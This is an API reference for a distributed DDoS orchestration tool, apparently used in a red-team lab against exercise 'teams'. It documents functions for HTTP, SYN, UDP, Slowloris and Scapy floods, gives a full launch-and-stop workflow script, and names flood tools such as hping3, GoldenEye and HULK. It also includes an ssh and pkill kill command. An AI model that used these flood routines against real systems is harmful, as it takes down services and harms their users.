# DDoS Orchestrator - Quick API Reference

## Stop Attack Methods

### `stop_attack(attack_id: str) -> bool`
Stop a specific running attack.

**Parameters:**
- `attack_id`: The unique ID of the attack to stop

**Returns:**
- `True` if stopped successfully
- `False` if failed or already stopped

**Example:**
```python
orchestrator.stop_attack("a1b2c3d4-e5f6-7890-abcd-ef1234567890")
```

---

### `stop_all_attacks() -> Dict[str, bool]`
Stop all running attacks.

**Returns:**
- Dictionary mapping attack IDs to success status

**Example:**
```python
results = orchestrator.stop_all_attacks()
# {"attack1": True, "attack2": True, "attack3": False}
```

---

## Attack Execution with Background Mode

### All attack methods now support `background` parameter:

```python
execute_http_flood(
    attacker_vm: str,
    target_ip: str,
    port: int = 80,
    workers: int = 50,
    sockets: int = 100,
    duration: int = 300,
    background: bool = False  # NEW!
) -> str
```

```python
execute_syn_flood(
    attacker_vm: str,
    target_ip: str,
    port: int = 80,
    duration: int = 300,
    background: bool = False  # NEW!
) -> str
```

```python
execute_udp_flood(
    attacker_vm: str,
    target_ip: str,
    port: int = 53,
    duration: int = 300,
    background: bool = False  # NEW!
) -> str
```

```python
execute_slowloris(
    attacker_vm: str,
    target_ip: str,
    port: int = 80,
    sockets: int = 200,
    duration: int = 300,
    background: bool = False  # NEW!
) -> str
```

```python
execute_scapy_flood(
    attacker_vm: str,
    target_ip: str,
    port: int = 80,
    attack_type: str = "syn",  # "syn", "udp", or "icmp"
    duration: int = 300,
    background: bool = False  # NEW!
) -> str
```

---

### `execute_distributed_attack()`

```python
execute_distributed_attack(
    attack_type: str,        # "http_flood", "syn_flood", "udp_flood",
                             # "slowloris", "scapy_syn", "scapy_udp", "scapy_icmp"
    target_team: str,        # "team1", "team2", "team3"
    target_port: int = 80,
    duration: int = 300,
    num_attackers: int = 3,
    capture_on_target: bool = True,
    background: bool = True  # NEW! Default is True now
) -> List[str]               # Returns list of attack IDs
```

**Example:**
```python
attack_ids = orchestrator.execute_distributed_attack(
    attack_type="syn_flood",
    target_team="team1",
    target_port=9080,
    duration=600,
    num_attackers=2,
    background=True  # Can stop early
)
```

---

## Complete Workflow Example

```python
from distributed_ddos_executor import DDoSOrchestrator
import time

# Initialize
orchestrator = DDoSOrchestrator()

# Launch attacks in background
attack_ids = orchestrator.execute_distributed_attack(
    attack_type="http_flood",
    target_team="team1",
    target_port=9080,
    duration=600,  # 10 minutes max
    background=True
)

# Run for 2 minutes
time.sleep(120)

# Check status
for attack_id in attack_ids:
    status = orchestrator.get_attack_status(attack_id)
    print(f"{attack_id}: {status['status']}")

# Stop all
orchestrator.stop_all_attacks()

# Export results
orchestrator.export_results("/tmp/results.json")
```

---

## Emergency Stop Script

**File:** `stop_attacks.py`

**Usage:**
```bash
python3 stop_attacks.py
```

**What it does:**
- Connects to all Red Team VMs
- Kills all attack processes:
  - `hping3`
  - `slowloris`
  - `goldeneye.py`
  - `scapy_ddos.py`
  - `hulk.py`

**Manual equivalent:**
```bash
ssh mist@10.72.200.62
sudo pkill -9 -f "hping3|slowloris|goldeneye|scapy_ddos|hulk"
```

---

## Attack Status Values

| Status | Description |
|--------|-------------|
| `running` | Attack is currently executing |
| `completed` | Attack finished normally (timeout reached) |
| `stopped` | Attack was stopped early via `stop_attack()` |
| `failed` | Attack failed to start or errored |

---

## Process Name Mapping

| Tool | Process Name Pattern |
|------|---------------------|
| hping3 | `hping3` |
| Slowloris | `slowloris` |
| GoldenEye | `python3.*goldeneye` |
| Scapy DDoS | `python3.*scapy_ddos` |
| HULK | `python3.*hulk` |

These patterns are used by `pkill -f` to identify and kill processes.

---

## Tips

✅ **Use background=True** for attacks you might need to stop early
✅ **Track attack IDs** - you'll need them to stop specific attacks
✅ **Monitor status** - call `get_attack_status()` periodically
✅ **Always export results** - call `export_results()` before exiting
✅ **Keep stop_attacks.py handy** - for emergency shutdowns

⚠️ **Note**: Attacks in background mode won't return stdout/stderr until completion
